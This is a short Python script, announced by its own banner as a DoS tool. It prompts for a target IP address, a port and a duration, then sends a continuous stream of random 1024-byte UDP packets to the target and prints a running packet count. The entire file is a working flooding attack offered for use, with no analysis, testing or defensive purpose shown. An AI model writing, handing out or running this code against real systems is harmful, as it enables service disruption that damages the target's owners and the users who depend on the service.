import os
import time
import sys
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
os.system('cls')
print("welcome to DoS")
ip = input("Target IP: ")
port = int(input("Port: "))
dur = float(input("Time: "))
timeout = time.time() + dur
sent = 0
while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes,(ip, port))
        sent = sent +1
        print("Sent %s packets to %s through port %s" %(sent, ip, port))
    except KeyboardInterrupt:
        sys.exit()
